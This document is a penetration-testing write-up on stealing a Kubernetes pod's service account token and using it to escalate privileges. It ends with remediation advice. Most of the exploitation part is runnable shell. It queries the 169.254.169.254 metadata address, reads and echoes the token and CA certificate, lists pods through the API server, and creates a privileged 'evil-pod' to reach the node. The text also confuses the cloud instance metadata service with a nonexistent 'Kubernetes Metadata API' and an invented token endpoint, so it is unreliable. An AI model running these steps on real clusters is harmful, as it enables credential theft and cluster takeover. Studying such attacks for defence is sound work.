
# Kubernetes Metadata Service Exploitation from Pods

## 1. Overview Section

This document details the exploitation of the Kubernetes Metadata service from within a pod. This vulnerability allows an attacker who has gained initial access to a pod to potentially escalate privileges and gain control over the entire Kubernetes cluster.

**Attack vector description:**

An attacker leverages the Kubernetes Metadata API, which provides information about the running pod and the Kubernetes cluster itself. This API is typically exposed unauthenticated within the pod's network namespace at the IP address `169.254.169.254` (link-local IP). The attacker can query this API to obtain sensitive information like service account tokens and potentially access other resources in the cluster.

**Potential impact and consequences:**

*   **Privilege escalation:** Retrieving the service account token allows an attacker to authenticate as the pod's service account. Depending on the permissions granted to this service account, the attacker can perform actions such as creating, deleting, and modifying resources within the cluster.
*   **Data exfiltration:** Access to cluster resources could lead to the exfiltration of sensitive data stored in pods, persistent volumes, or databases.
*   **Lateral movement:** The attacker can use the compromised service account to access other pods and resources in the cluster, expanding their control.
*   **Cluster takeover:** If the service account has cluster-admin privileges, the attacker can effectively take control of the entire Kubernetes cluster.

**Risk level assessment:**

**High**. While initial access to a pod is required, the potential for full cluster compromise makes this a high-risk vulnerability.

**Technical explanation of why this vulnerability exists:**

The vulnerability stems from the design of the Kubernetes Metadata API and the default security posture of many Kubernetes deployments. The API is intended to be used by applications running within the pod to discover information about their environment. However, it is often exposed without any authentication, relying on network isolation to prevent unauthorized access. If an attacker can gain access to the pod's network namespace (e.g., through an application vulnerability or container breakout), they can directly query the API. The default service account assigned to pods might also have overly permissive roles, amplifying the risk.

**Prerequisites and conditions needed:**

*   **Access to a pod:** The attacker must have some form of access to a running pod in the Kubernetes cluster. This could be achieved through exploiting a vulnerability in an application running within the pod, a container breakout, or by gaining access to the node the pod is running on.
*   **`curl` or similar HTTP client:**  The pod must have a utility like `curl`, `wget`, or `httpie` installed to make HTTP requests to the metadata service. Most base images include `curl`.
*   **Service account with permissions:** The service account assigned to the pod must have permissions that an attacker can exploit.  Even basic `get` permissions can be leveraged if the resources are sensitive.

## 2. Validation and Exploitation Steps Section

This section details the steps to validate and exploit the Kubernetes Metadata Service vulnerability.

**1. Gain Access to a Pod:**

This documentation assumes you already have access to a pod.  This could be via an exploited web application vulnerability, SSH access to the node, or kubectl exec into the pod if you have sufficient RBAC permissions.

**2. Validate the Metadata Service Endpoint:**

This step confirms the existence and accessibility of the metadata service.

```bash
curl -s http://169.254.169.254/latest/meta-data/
```

*   **Explanation:** This command sends an HTTP GET request to the root endpoint of the metadata service (`169.254.169.254/latest/meta-data/`).
*   **Why:**  This checks if the metadata service is accessible from within the pod.
*   **Expected Output:** A list of available metadata endpoints, such as `instance-id`, `network`, `services`, `hostname`. An error message indicates the service is not accessible.

```
ami-id
ami-launch-index
ami-manifest-path
hostname
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
```

*   **How it contributes:** Verifies the existence of the metadata service and the ability to query it.

**3. Retrieve the Service Account Token Path:**

This step retrieves the path to the service account token within the pod's filesystem.

```bash
curl -s http://169.254.169.254/latest/meta-data/service-account/token
```

*   **Explanation:** This command attempts to retrieve the path to the service account token. In older versions of Kubernetes, this might directly return the token. In newer versions, it will likely return an error or a token path.
*   **Why:**  We need the path to the service account token file.
*   **Expected Output:** Either an error (indicating no token) or the path to the token file. If an error is returned, try the next command (step 4). A typical path is `/var/run/secrets/kubernetes.io/serviceaccount/token`

**Alternative approaches for getting the token path**
The service account token is stored by default in `/var/run/secrets/kubernetes.io/serviceaccount/token`. If the previous command fails you may assume this path and proceed.

**4. Retrieve the Service Account Token (if path is known or assumed):**

This step retrieves the actual service account token from the filesystem.

```bash
TOKEN_PATH=/var/run/secrets/kubernetes.io/serviceaccount/token
TOKEN=$(cat $TOKEN_PATH)
echo $TOKEN
```

*   **Explanation:**
    *   `TOKEN_PATH=/var/run/secrets/kubernetes.io/serviceaccount/token`: Sets a variable to the default path of the service account token.
    *   `TOKEN=$(cat $TOKEN_PATH)`: Reads the content of the token file and stores it in the `TOKEN` variable.
    *   `echo $TOKEN`: Prints the value of the `TOKEN` variable, revealing the service account token.
*   **Why:**  This retrieves the service account token, which is crucial for authenticating as the pod's service account.
*   **Expected Output:**  A long string representing the service account token (JWT).
*   **How it contributes:** Obtains the token necessary for further exploitation.

**5. Retrieve the Service Account CA Certificate (Optional but recommended):**

This step retrieves the CA certificate, which might be needed for verifying the server certificate when making requests to the Kubernetes API server.

```bash
CA_CERT_PATH=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
CA_CERT=$(cat $CA_CERT_PATH)
echo $CA_CERT
```

*   **Explanation:**
    *   `CA_CERT_PATH=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt`: Sets a variable to the default path of the CA certificate.
    *   `CA_CERT=$(cat $CA_CERT_PATH)`: Reads the content of the CA certificate file and stores it in the `CA_CERT` variable.
    *   `echo $CA_CERT`: Prints the CA certificate.
*   **Why:**  Provides the CA certificate for secure communication with the Kubernetes API server.
*   **Expected Output:**  The PEM-encoded CA certificate.
*   **How it contributes:**  Enhances the security of subsequent API requests.

**6. Determine the Kubernetes API Server Address:**

This step retrieves the Kubernetes API server address.  Many times it is accessible via the service account's discovery endpoint.

```bash
KUBE_API_URL=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
echo $KUBE_API_URL
```

*   **Explanation:** This command uses `kubectl` within the pod (assuming it's available) to extract the Kubernetes API server URL from the in-cluster configuration. It filters down the output to the server endpoint.
*   **Why:** To determine where to direct our API calls to.
*   **Expected Output:** The URL of the Kubernetes API server, such as `https://10.96.0.1:443`.
* **How it contributes:** Provides the target for authentication and exploitation.

**Alternative Approach if kubectl is not available**

```bash
KUBE_API_URL=https://kubernetes.default.svc
echo $KUBE_API_URL
```

This assumes the common internal DNS name of the kubernetes API.  If this resolves, proceed with this endpoint.

**7. Authenticate and Query the API Server (Exploitation):**

This step uses the retrieved service account token to authenticate and query the API server, demonstrating exploitation.

```bash
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
curl -s -H "Authorization: Bearer $TOKEN" --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt $KUBE_API_URL/api/v1/namespaces/$NAMESPACE/pods
```

*   **Explanation:**
    *   `NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)`:  Retrieves the namespace the pod is running in.
    *   `curl -s -H "Authorization: Bearer $TOKEN" --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt $KUBE_API_URL/api/v1/namespaces/$NAMESPACE/pods`: Sends an HTTP GET request to the API server to list pods within the pod's namespace, authenticating with the retrieved service account token.  The `--cacert` option specifies the CA certificate for verifying the server's certificate.
*   **Why:** This confirms that the service account token can be used to authenticate and access resources in the cluster. This step attempts to list all the pods within the same namespace.
*   **Expected Output:** A JSON response containing information about the pods in the namespace.  If the token is invalid or the service account lacks sufficient permissions, an error message will be returned.
*   **How it contributes:** Demonstrates successful authentication and potential for further exploitation.

**8. Expand Exploitation (Example: Creating a Pod with elevated privileges):**

If the service account has sufficient permissions, an attacker could create a pod with elevated privileges.  This is just an example.

```bash
cat <<EOF > exploit.json
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "evil-pod"
  },
  "spec": {
    "containers": [
      {
        "name": "evil-container",
        "image": "alpine/git",
        "securityContext": {
          "privileged": true
        },
        "command": ["/bin/sh", "-c", "while true; do sleep 3600; done"]
      }
    ]
  }
}
EOF

curl -s -H "Authorization: Bearer $TOKEN" --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Content-Type: application/json" -X POST -d @exploit.json $KUBE_API_URL/api/v1/namespaces/$NAMESPACE/pods
```

*   **Explanation:**
    *   Creates a pod definition file (`exploit.json`) that defines a new pod with `privileged: true`.  The privileged flag allows the container to access the host's kernel and all devices. The command specifies an infinite sleep to keep the pod running.
    *   Uses `curl` to send a POST request to the Kubernetes API server, creating the pod. The request includes the service account token for authentication, the CA certificate for SSL verification, and the pod definition data.
*   **Why:** This attempts to create a privileged pod, demonstrating the potential for privilege escalation.
*   **Expected Output:** A JSON response indicating the successful creation of the pod or an error message if the creation fails (e.g., due to insufficient permissions).
*   **How it contributes:** Demonstrates successful privilege escalation, giving the attacker access to the underlying node.

**Remediation Recommendations:**

*   **Restrict Service Account Permissions:** Implement the principle of least privilege by granting service accounts only the minimum permissions necessary for their intended functions. Regularly review and audit service account permissions.  Use Pod Security Standards to limit the capabilities of pods.
*   **Disable Metadata API Access (where possible):** If the Metadata API is not required by your application, consider disabling it entirely. This can be achieved through various methods, depending on the container runtime and the cloud provider.
*   **Network Policies:** Implement network policies to restrict network access to the Metadata API.  Limit traffic to the `169.254.169.254` address.
*   **Pod Security Policies/Admission Controllers:** Use Pod Security Policies (now deprecated, migrate to Pod Security Admission) or Admission Controllers to enforce security policies that restrict the creation of privileged pods and other potentially dangerous configurations.
*   **Regularly Audit Cluster Configuration:** Regularly audit the Kubernetes cluster configuration to identify and remediate any security misconfigurations.
*   **Use Updated Kubernetes Versions:** Keep your Kubernetes cluster up-to-date with the latest security patches and features.  Newer versions of Kubernetes have implemented improvements in security and authentication. Consider enabling `NodeRestriction` admission controller for improved protection against node compromise.
